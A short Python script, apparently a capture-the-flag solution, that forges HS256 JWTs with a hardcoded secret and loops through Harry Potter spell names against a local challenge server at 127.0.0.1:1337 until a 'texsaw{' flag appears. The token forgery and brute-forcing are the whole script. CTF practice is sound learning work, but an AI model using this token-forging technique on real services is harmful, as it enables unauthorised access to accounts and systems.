import jwt
import requests
import os
import argparse

"make sure u give it session key as arg"

parser = argparse.ArgumentParser()
parser.add_argument("--session", type=str, help="User Session Key")
args = parser.parse_args()

if args.session is None:
	exit()

my_spells=["Expelliarmus", "Stupefy", "Protego", "Protego Maxima", "Petrificus Totalus",
 "Reducto", "Confringo", "Bombarda", "Diffindo", "Impedimenta", "Rictusempra",
 "Levicorpus", "Incarcerous", "Relashio", "Oppugno", "Finite Incantatem",
 "Lumos Maxima", "Homenum Revelio", "Salvio Hexia", "Cave Inimicum", "Muffliato",
 "Glisseo", "Everte Statum", "Expecto Patronum", "Langlock"]
url = "http://127.0.0.1:1337/magic"


for spell in my_spells:
    payload= {
  "date": "1998-05-02T09:45:00.000000+00:00",
  "spell": spell,
  "loc": "battle of hogwarts"
    }
    token=jwt.encode(payload, "SlccjCzySpcxtzyp",'HS256')
    cookies = {"session":args.session
    }
    request_header = {
                   "X-Magic-Token":token}
    
    response = requests.get(url, headers=request_header, cookies=cookies)

    if "texsaw{" in response.text : 
        print("yay success: ",spell)
        print(response.text)
        exit()
